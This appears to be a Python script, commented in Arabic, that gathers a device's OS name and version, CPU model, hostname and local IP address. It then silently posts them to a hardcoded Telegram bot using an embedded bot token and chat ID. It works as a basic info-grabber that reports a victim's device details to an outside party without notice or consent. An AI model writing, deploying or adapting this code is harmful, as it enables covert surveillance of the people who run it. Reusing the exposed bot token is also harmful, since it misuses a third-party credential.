import socket 
import requests
import subprocess
import platform

def get_phone_info():
    # نظام التشغيل على هاتفك (Android أو iOS)
    os_name = platform.system()

    # إصدار نظام التشغيل
    os_version = platform.release()

    # نوع المعالج في هاتفك
    try:
        processor_info = subprocess.check_output(['cat', '/proc/cpuinfo']).decode()
        processor = [line for line in processor_info.split('\n') if 'model name' in line][0].			split(':')[1].strip()
    except:
        processor = "غير معروف"

    # قد تحتاج إلى طرق مختلفة حسب نوع هاتفك ونظام التشغيل للحصول على المزيد من المعلومات

    return os_name, os_version, processor

if __name__ == "__main__":
    phone_os, phone_os_version, phone_processor = get_phone_info()
def get_device_name():
    # الحصول على اسم المضيف (اسم جهاز الكمبيوتر)
    host_name = socket.gethostname()
    
    # الحصول على اسم النظام التشغيل (مثل Windows, Linux, macOS إلخ)
    os_name = platform.system()

    return host_name, os_name

if __name__ == "__main__":
    device_name, os_name = get_device_name()

# إنشاء مأخذ الاتصال
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# ربط مأخذ الاتصال بعنوان IP ورقم المنفذ المطلوبين
try :
  s.connect(('www.google.com', 80))
except :
  print("Connection Errorr ")
  pass

# الحصول على عنوان IP المستخدم في الاتصال
ip_address = s.getsockname()[0]

# إغلاق مأخذ الاتصال
s.close()


id = ('5589465204')
token = ('6477425694:AAExSQEhdvXQtNPmzavlpnDKSUkC1CFZkRw')


#my website : https://alhelfi.softr.app
telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=user info\nip: {ip_address}\ndevice name : {device_name}\nsystem name : {os_name}\nphone version : {phone_os_version}\nphone prossecor : {phone_processor }')
req = requests.post(telegram_sand)
